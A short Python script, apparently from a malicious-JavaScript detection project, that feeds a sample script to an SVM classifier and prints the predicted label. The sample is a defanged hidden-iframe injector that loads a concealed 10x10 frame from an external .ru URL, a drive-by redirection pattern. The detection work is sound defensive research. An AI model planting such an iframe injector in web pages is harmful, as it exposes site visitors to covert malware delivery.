from svmutil import svm_predict
from Project.ScriptVector import scriptVectorize
from Project.TrainData import createModel

def evaluate(s):
    values = scriptVectorize(s)
    m = createModel()
    p_label, p_acc, p_val = svm_predict([0], values, m, '-q')
    return p_label


s = r'''
if (do​cument.get​Elements​ByTagName('body')[0]){   iframer();
}
else {
  do​cument.wr​ite("
&lt;if rame src='hxxp://​g3service​.ru​/in.php?a=QQkFBwQEAAADBgAGEkcJBQcEAQQHDQAMAg==' width='10'
 height='10' style='visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;");
}
function iframer(){
  var f = do​cument.cr​eateElement('iframe');
  f.setAttribute('src',
  'hxxp://​g3service​.ru​/in.php?a=QQkFBwQEAAADBgAGEkcJBQcEAQQHDQAMAg==');
  f.style.visibility = 'hidden';
  f.style.position = 'absolute';
  f.style.left = '0';
  f.style.top = '0';
  f.setAttribute('width', '10');
  f.setAttribute('height', '10');
  do​cument.get​ElementsByTagName('body')[0].append​Child(f);
}}
'''
print(evaluate(s))
